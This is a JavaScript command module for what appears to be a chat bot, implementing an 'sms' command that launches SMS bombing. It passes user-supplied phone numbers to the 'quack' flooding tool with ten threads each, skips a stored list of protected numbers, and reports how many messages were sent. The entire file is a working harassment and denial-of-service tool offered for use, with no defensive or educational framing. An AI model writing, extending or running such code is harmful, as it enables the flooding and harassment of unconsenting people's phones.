module.exports = {
    name: 'sms',
    execute(ctx, params){
        const { spawn, exec } = require("child_process");
        const { jmongo } = params;

        const args = ctx.state.command.splitArgs;

        if(parseInt(args[1])>parseInt(process.env.SMS_BOMB_LIMIT)){
            ctx.reply(`The timeout is too big, current limit is: ${process.env.SMS_BOMB_LIMIT}`)
        }
        else{
            jmongo.loadAll
            jmongo.loadAll('bannedNumbers', (result) => {
                result = result.map(element => element.number);
                const numbers_filtered = args[0].split(',').filter(element => !result.includes(element));
                const protected_numbers = args[0].split(',').filter(element => result.includes(element));

                if(protected_numbers.length > 0) {
                    ctx.reply(`${protected_numbers.join(', ')} are protected numbers`);
                }
                if(numbers_filtered.length > 0) {
                    ctx.reply(`Started SMS bombing on ${numbers_filtered.join(', ')}`);
                }

                for(let i=0; i<numbers_filtered.length; i++){
                    const ls = spawn("quack", ["--tool", "sms", "--target", numbers_filtered[i], "--timeout", args[1], "--threads", "10"]);
                    setTimeout(function(){
                        executeBombing(ls);
                    }, i * 1000)
                }
            })
        }

        function executeBombing(ls){
            let amount = 0;
            ls.stdout.on("data", data => {
                const split = String(data).split(/\r?\n/);
                for(let i=0; i<split.length; i++){
                    if(split[i].indexOf('[+]')!=-1){
                        amount++;
                    }
                }
            });

            ls.stderr.on("data", data => {
                ctx.reply('There was an error: ' + data);
            });

            ls.on('error', (error) => {
                ctx.reply('There was an error: ' + error.message);
            });

            ls.on("close", code => {
                ctx.reply(`Bombing completed, ${amount} messages sent`);
            });
        }    
    }
}